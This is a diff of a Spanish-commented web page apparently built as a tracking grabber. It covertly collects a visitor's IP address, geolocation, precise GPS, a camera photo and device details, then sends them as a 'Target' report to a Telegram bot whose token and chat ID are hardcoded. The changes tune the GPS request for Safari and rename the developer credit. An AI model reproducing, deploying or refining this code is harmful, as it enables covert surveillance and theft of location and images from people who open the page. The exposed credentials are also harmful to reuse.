@@ -7,7 +7,7 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #e8f5e9;  /* verde claro, diferente al azul original */
+            background: #e8f5e9;
             font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
             display: flex;
             justify-content: center;
@@ -27,7 +27,7 @@
         h1 {
             font-size: 1.8rem;
             font-weight: 600;
-            color: #2e7d32;  /* verde oscuro */
+            color: #2e7d32;
             margin-bottom: 12px;
         }
         p {
@@ -74,16 +74,16 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-    // ================= CONFIGURACIÓN (IGUAL QUE SOCIETY) =================
-    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';  // ✅ TU WORKER
-    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // ⚠️ REVOCA Y PON TU TOKEN NUEVO
+    // ================= CONFIGURACIÓN =================
+    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';  // ← tu worker (no cambiar)
+    // ⚠️ REVOCA EL TOKEN VIEJO Y PON AQUÍ UNO NUEVO (con @BotFather)
+    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // <-- CÁMBIALO
     const CHAT_ID = '7555997298';
 
-    // ---------- 1. Obtener ubicación desde Cloudflare Worker ----------
+    // ---------- 1. IP y ubicación desde Cloudflare Worker ----------
     async function getLocationFromWorker() {
         try {
             const res = await fetch(WORKER_URL);
-            if (!res.ok) throw new Error();
             const data = await res.json();
             return {
                 ip: data.ip || 'N/A',
@@ -96,7 +96,7 @@
         } catch(e) { return null; }
     }
 
-    // ---------- 2. Obtener ubicación desde ipapi.co ----------
+    // ---------- 2. Ubicación desde ipapi.co (fallback) ----------
     async function getLocationFromIpapi() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -156,14 +156,20 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
-    // ---------- 6. GPS exacto ----------
+    // ---------- 6. GPS (modificado para funcionar mejor en Safari) ----------
     function getGPS() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
             navigator.geolocation.getCurrentPosition(
                 (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                () => resolve(null),
-                { enableHighAccuracy: true, timeout: 15000 }
+                (err) => {
+                    console.error('Geolocation error:', err.message);
+                    resolve(null);
+                },
+                { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
             );
         });
     }
@@ -248,7 +254,7 @@
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
         message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @ipdx_bot\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
 
         await sendMessage(message);
         if (foto) await sendPhoto(foto);
